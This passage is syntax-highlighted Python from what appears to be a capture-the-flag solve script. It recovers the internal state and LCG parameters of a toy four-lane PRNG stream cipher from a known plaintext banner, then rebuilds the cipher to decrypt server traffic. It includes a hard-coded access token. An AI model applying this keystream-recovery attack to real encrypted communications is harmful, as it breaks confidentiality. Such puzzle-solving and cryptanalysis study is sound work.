style="color:#2993a3">(</span><span style="color:#998418">len</span><span style="color:#1e754f">(</span><span style="color:#393A34">states</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        x0</span><span style="color:#999999">,</span><span style="color:#393A34"> x1</span><span style="color:#999999">,</span><span style="color:#393A34"> x2 </span><span style="color:#999999">=</span><span style="color:#393A34"> states</span><span style="color:#2993a3">[</span><span style="color:#393A34">i</span><span style="color:#2993a3">]</span><span style="color:#999999">,</span><span style="color:#393A34"> states</span><span style="color:#2993a3">[</span><span style="color:#393A34">i </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">]</span><span style="color:#999999">,</span><span style="color:#393A34"> states</span><span style="color:#2993a3">[</span><span style="color:#393A34">i </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 2</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">        dx </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">x1 </span><span style="color:#AB5959">-</span><span style="color:#393A34"> x0</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFFFFFFFFFFFF</span><br><span style="color:#393A34">        dy </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">x2 </span><span style="color:#AB5959">-</span><span style="color:#393A34"> x1</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFFFFFFFFFFFF</span><br><span style="color:#393A34">        pairs</span><span style="color:#999999">.</span><span style="color:#393A34">append</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">dx</span><span style="color:#999999">,</span><span style="color:#393A34"> dy</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    best_idx </span><span style="color:#999999">=</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><br><span style="color:#393A34">    min_tz </span><span style="color:#999999">=</span><span style="color:#2F798A"> 65</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> i</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">dx</span><span style="color:#999999">,</span><span style="color:#393A34"> _</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> in</span><span style="color:#998418"> enumerate</span><span style="color:#2993a3">(</span><span style="color:#393A34">pairs</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> dx </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 0</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            continue</span><br><span style="color:#393A34">        tz </span><span style="color:#999999">=</span><span style="color:#393A34"> count_trailing_zeros</span><span style="color:#2993a3">(</span><span style="color:#393A34">dx</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> tz </span><span style="color:#AB5959">&#x3C;</span><span style="color:#393A34"> min_tz</span><span style="color:#999999">:</span><br><span style="color:#393A34">            min_tz </span><span style="color:#999999">=</span><span style="color:#393A34"> tz</span><br><span style="color:#393A34">            best_idx </span><span style="color:#999999">=</span><span style="color:#393A34"> i</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> best_idx </span><span style="color:#AB5959">==</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        return</span><span style="color:#1E754F"> None</span><br><br><span style="color:#393A34">    dx_best</span><span style="color:#999999">,</span><span style="color:#393A34"> dy_best </span><span style="color:#999999">=</span><span style="color:#393A34"> pairs</span><span style="color:#2993a3">[</span><span style="color:#393A34">best_idx</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    k </span><span style="color:#999999">=</span><span style="color:#393A34"> min_tz</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">dy_best </span><span style="color:#AB5959">&#x26;</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#a65e2b">(</span><span style="color:#2F798A">1</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#393A34"> k</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 1</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 0</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        return</span><span style="color:#1E754F"> None</span><br><br><span style="color:#393A34">    mod_reduced </span><span style="color:#999999">=</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#2F798A">64</span><span style="color:#AB5959"> -</span><span style="color:#393A34"> k</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    dx_odd </span><span style="color:#999999">=</span><span style="color:#393A34"> dx_best </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#393A34"> k</span><br><span style="color:#393A34">    dy_reduced </span><span style="color:#999999">=</span><span style="color:#393A34"> dy_best </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#393A34"> k</span><br><span style="color:#393A34">    a_base </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">dy_reduced </span><span style="color:#AB5959">*</span><span style="color:#393A34"> modinv</span><span style="color:#1e754f">(</span><span style="color:#393A34">dx_odd</span><span style="color:#999999">,</span><span style="color:#393A34"> mod_reduced</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">mod_reduced </span><span style="color:#AB5959">-</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    step </span><span style="color:#999999">=</span><span style="color:#393A34"> mod_reduced</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#393A34"> k</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        a_cand </span><span style="color:#999999">=</span><span style="color:#393A34"> a_base </span><span style="color:#AB5959">+</span><span style="color:#393A34"> i </span><span style="color:#AB5959">*</span><span style="color:#393A34"> step</span><br><span style="color:#1E754F">        if</span><span style="color:#998418"> all</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">a_cand </span><span style="color:#AB5959">*</span><span style="color:#393A34"> dx</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFFFFFFFFFFFF</span><span style="color:#AB5959"> ==</span><span style="color:#393A34"> dy </span><span style="color:#1E754F">for</span><span style="color:#393A34"> dx</span><span style="color:#999999">,</span><span style="color:#393A34"> dy </span><span style="color:#1E754F">in</span><span style="color:#393A34"> pairs</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">            x0</span><span style="color:#999999">,</span><span style="color:#393A34"> x1 </span><span style="color:#999999">=</span><span style="color:#393A34"> states</span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#2993a3">]</span><span style="color:#999999">,</span><span style="color:#393A34"> states</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">            b </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">x1 </span><span style="color:#AB5959">-</span><span style="color:#393A34"> a_cand </span><span style="color:#AB5959">*</span><span style="color:#393A34"> x0</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFFFFFFFFFFFF</span><br><span style="color:#1E754F">            return</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><span style="color:#B5695977">"</span><span style="color:#B56959">A</span><span style="color:#B5695977">"</span><span style="color:#999999">:</span><span style="color:#393A34"> a_cand</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">B</span><span style="color:#B5695977">"</span><span style="color:#999999">:</span><span style="color:#393A34"> b</span><span style="color:#2993a3">}</span><br><span style="color:#1E754F">    return</span><span style="color:#1E754F"> None</span><br><br><br><span style="color:#A0ADA0"># ---------------------------------------------------------------------------</span><br><span style="color:#A0ADA0"># Keystream PRNG</span><br><span style="color:#A0ADA0"># ---------------------------------------------------------------------------</span><br><br><span style="color:#AB5959">class</span><span style="color:#2E8F82"> ToyPRNG</span><span style="color:#999999">:</span><br><span style="color:#AB5959">    def</span><span style="color:#998418"> __init__</span><span style="color:#2993a3">(</span><span style="color:#393A34">self</span><span style="color:#999999">,</span><span style="color:#393A34"> params</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">lanes </span><span style="color:#999999">=</span><span style="color:#393A34"> params  </span><span style="color:#A0ADA0"># list of dicts with A,B,X</span><br><span style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">idx </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> get_keystream_block</span><span style="color:#2993a3">(</span><span style="color:#393A34">self</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        lane </span><span style="color:#999999">=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">lanes</span><span style="color:#2993a3">[</span><span style="color:#A65E2B">self</span><span style="color:#999999">.</span><span style="color:#393A34">idx</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">        x </span><span style="color:#999999">=</span><span style="color:#393A34"> lane</span><span style="color:#2993a3">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">X</span><span style="color:#B5695977">"</span><span style="color:#2993a3">]</span><br><br><span style="color:#393A34">        v6 </span><span style="color:#999999">=</span><span style="color:#393A34"> x</span><br><span style="color:#393A34">        t </span><span style="color:#999999">=</span><span style="color:#393A34"> v6 </span><span style="color:#AB5959">^</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">v6 </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        t </span><span style="color:#999999">^=</span><span style="color:#393A34"> t </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 2</span><br><span style="color:#393A34">        t </span><span style="color:#999999">^=</span><span style="color:#393A34"> t </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 4</span><br><span style="color:#393A34">        t </span><span style="color:#999999">^=</span><span style="color:#393A34"> t </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 8</span><br><span style="color:#393A34">        v7 </span><span style="color:#999999">=</span><span style="color:#393A34"> t </span><span style="color:#AB5959">^</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">t </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        val </span><span style="color:#999999">=</span><span style="color:#393A34"> v7 </span><span style="color:#AB5959">^</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">v7 </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 32</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        k_block </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">val </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 7</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">val </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 57</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFFFFFFFFFFFF</span><br><br><span style="color:#393A34">        lane</span><span style="color:#2993a3">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">X</span><span style="color:#B5695977">"</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">lane</span><span style="color:#1e754f">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">A</span><span style="color:#B5695977">"</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> *</span><span style="color:#393A34"> x </span><span style="color:#AB5959">+</span><span style="color:#393A34"> lane</span><span style="color:#1e754f">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">B</span><span style="color:#B5695977">"</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFFFFFFFFFFFF</span><br><span style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">idx </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#A65E2B">self</span><span style="color:#999999">.</span><span style="color:#393A34">idx </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> %</span><span style="color:#2F798A"> 4</span><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> k_block</span><span style="color:#999999">.</span><span style="color:#393A34">to_bytes</span><span style="color:#2993a3">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">little</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> encrypt</span><span style="color:#2993a3">(</span><span style="color:#393A34">self</span><span style="color:#999999">,</span><span style="color:#393A34"> data</span><span style="color:#999999">:</span><span style="color:#998418"> bytes</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        if</span><span style="color:#998418"> isinstance</span><span style="color:#2993a3">(</span><span style="color:#393A34">data</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">            data </span><span style="color:#999999">=</span><span style="color:#393A34"> data</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        out </span><span style="color:#999999">=</span><span style="color:#998418"> bytearray</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        ks </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">""</span><br><span style="color:#1E754F">        while</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">ks</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">data</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">            ks </span><span style="color:#999999">+=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">get_keystream_block</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        for</span><span style="color:#393A34"> a</span><span style="color:#999999">,</span><span style="color:#393A34"> b </span><span style="color:#1E754F">in</span><span style="color:#998418"> zip</span><span style="color:#2993a3">(</span><span style="color:#393A34">data</span><span style="color:#999999">,</span><span style="color:#393A34"> ks</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">            out</span><span style="color:#999999">.</span><span style="color:#393A34">append</span><span style="color:#2993a3">(</span><span style="color:#393A34">a </span><span style="color:#AB5959">^</span><span style="color:#393A34"> b</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        return</span><span style="color:#998418"> bytes</span><span style="color:#2993a3">(</span><span style="color:#393A34">out</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    decrypt </span><span style="color:#999999">=</span><span style="color:#393A34"> encrypt</span><br><br><br><span style="color:#A0ADA0"># ---------------------------------------------------------------------------</span><br><span style="color:#A0ADA0"># Recovery from banner</span><br><span style="color:#A0ADA0"># ---------------------------------------------------------------------------</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> recover_cipher</span><span style="color:#2993a3">(</span><span style="color:#393A34">tube</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    tube</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">token:</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    tube</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">icqcb7c320de268ecb6e421212869a01</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    tube</span><span style="color:#999999">.</span><span style="color:#393A34">recvline</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#998418">    print</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">aaa</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    enc_hex </span><span style="color:#999999">=</span><span style="color:#393A34"> tube</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">430</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    while</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">enc_hex</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 430</span><span style="color:#999999">:</span><br><span style="color:#393A34">        enc_hex </span><span style="color:#999999">+=</span><span style="color:#393A34"> tube</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">430</span><span style="color:#AB5959"> -</span><span style="color:#998418"> len</span><span style="color:#1e754f">(</span><span style="color:#393A34">enc_hex</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0">    # Drop unencrypted newline after the hex banner to keep offsets aligned</span><br><span style="color:#1E754F">    try</span><span style="color:#999999">:</span><br><span style="color:#393A34">        leftover </span><span style="color:#999999">=</span><span style="color:#393A34"> tube</span><span style="color:#999999">.</span><span style="color:#393A34">recvline</span><span style="color:#2993a3">(</span><span style="color:#B07D48">timeout</span><span style="color:#999999">=</span><span style="color:#2F798A">0.2</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> leftover </span><span style="color:#AB5959">not</span><span style="color:#AB5959"> in</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">""</span><span style="color:#999999">,</span><span style="color:#1E754F"> None</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">            context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> and</span><span style="color:#393A34"> log</span><span style="color:#999999">.</span><span style="color:#393A34">debug</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Flushed newline: </span><span style="color:#1e754f">{</span><span style="color:#393A34">leftover</span><span style="color:#AB5959">!r</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    except</span><span style="color:#998418"> EOFError</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        pass</span><br><br><span style="color:#393A34">    enc_bytes </span><span style="color:#999999">=</span><span style="color:#998418"> bytes</span><span style="color:#999999">.</span><span style="color:#393A34">fromhex</span><span style="color:#2993a3">(</span><span style="color:#393A34">enc_hex</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    keystream </span><span style="color:#999999">=</span><span style="color:#998418"> bytearray</span><span style="color:#2993a3">(</span><span style="color:#393A34">enc_bytes</span><span style="color:#1e754f">[</span><span style="color:#393A34">i</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> ^</span><span style="color:#A65E2B"> BANNER_PT</span><span style="color:#1e754f">[</span><span style="color:#393A34">i</span><span style="color:#1e754f">]</span><span style="color:#1E754F"> for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#1e754f">(</span><span style="color:#998418">len</span><span style="color:#a65e2b">(</span><span style="color:#A65E2B">BANNER_PT</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    lanes </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#1e754f">[</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">[</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">[</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">[</span><span style="color:#1e754f">]</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    limit </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#998418">len</span><span style="color:#1e754f">(</span><span style="color:#393A34">keystream</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> //</span><span style="color:#2F798A"> 8</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#393A34"> limit</span><span style="color:#999999">,</span><span style="color:#2F798A"> 8</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        block </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#999999">.</span><span style="color:#393A34">from_bytes</span><span style="color:#2993a3">(</span><span style="color:#393A34">keystream</span><span style="color:#1e754f">[</span><span style="color:#393A34">i</span><span style="color:#999999">:</span><span style="color:#393A34"> i </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 8</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">little</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        state </span><span style="color:#999999">=</span><span style="color:#393A34"> recover_state_from_block</span><span style="color:#2993a3">(</span><span style="color:#393A34">block</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        lanes</span><span style="color:#2993a3">[</span><span style="color:#1e754f">(</span><span style="color:#393A34">i </span><span style="color:#AB5959">//</span><span style="color:#2F798A"> 8</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> %</span><span style="color:#2F798A"> 4</span><span style="color:#2993a3">]</span><span style="color:#999999">.</span><span style="color:#393A34">append</span><span style="color:#2993a3">(</span><span style="color:#393A34">state</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    params </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#2993a3">]</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        res </span><span style="color:#999999">=</span><span style="color:#393A34"> recover_ab_for_lane</span><span style="color:#2993a3">(</span><span style="color:#393A34">lanes</span><span style="color:#1e754f">[</span><span style="color:#393A34">i</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#AB5959"> not</span><span style="color:#393A34"> res</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            raise</span><span style="color:#998418"> RuntimeError</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Failed to recover lane </span><span style="color:#1e754f">{</span><span style="color:#393A34">i</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        last </span><span style="color:#999999">=</span><span style="color:#393A34"> lanes</span><span style="color:#2993a3">[</span><span style="color:#393A34">i</span><span style="color:#2993a3">]</span><span style="color:#2993a3">[</span><span style="color:#AB5959">-</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">        current </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">res</span><span style="color:#1e754f">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">A</span><span style="color:#B5695977">"</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> *</span><span style="color:#393A34"> last </span><span style="color:#AB5959">+</span><span style="color:#393A34"> res</span><span style="color:#1e754f">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">B</span><span style="color:#B5695977">"</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFFFFFFFFFFFF</span><br><span style="color:#393A34">        params</span><span style="color:#999999">.</span><span style="color:#393A34">append</span><span style="color:#2993a3">(</span><span style="color:#1e754f">{</span><span style="color:#B5695977">"</span><span style="color:#B56959">A</span><span style="color:#B5695977">"</span><span style="color:#999999">:</span><span style="color:#393A34"> res</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">A</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">]</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">B</span><span style="color:#B5695977">"</span><span style="color:#999999">:</span><span style="color:#393A34"> res</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">B</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">]</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">X</span><span style="color:#B5695977">"</span><span style="color:#999999">:</span><span style="color:#393A34"> current</span><span style="color:#1e754f">}</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    cipher </span><span style="color:#999999">=</span><span style="color:#393A34"> ToyPRNG</span><span style="color:#2993a3">(</span><span style="color:#393A34">params</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    cipher</span><span style="color:#999999">.</span><span style="color:#393A34">idx </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">limit </span><span style="color:#AB5959">//</span><span style="color:#2F798A"> 8</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> %</span><span style="color:#2F798A"> 4</span><br><span style="color:#1E754F">    if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">keystream</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> %</span><span style="color:#2F798A"> 8</span><span style="color:#999999">:</span><br><span style="color:#393A34">        cipher</span><span style="color:#999999">.</span><span style="color:#393A34">get_keystream_block</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> cipher</span><br><br><br><span style="color:#A0ADA0"># ---------------------------------------------------------------------------</span><br><span style="color:#A0ADA0"># Core interactions</span><br><span style="color:#A0ADA0"># ---------------------------------------------------------------------------</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> build_io</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">sys</span><span style="color:#999999">.</span><span style="color:#393A34">argv</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">></span><span style="color:#2F798A"> 1</span><span style="color:#AB5959"> and</span><span style="color:#393A34"> sys</span><span style="color:#999999">.</span><span style="color:#393A34">argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> "</span><span style="color:#B56959">remote</span><span style="color:#B5695977">"</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#A65E2B">HOST</span><span style="color:#999999">,</span><span 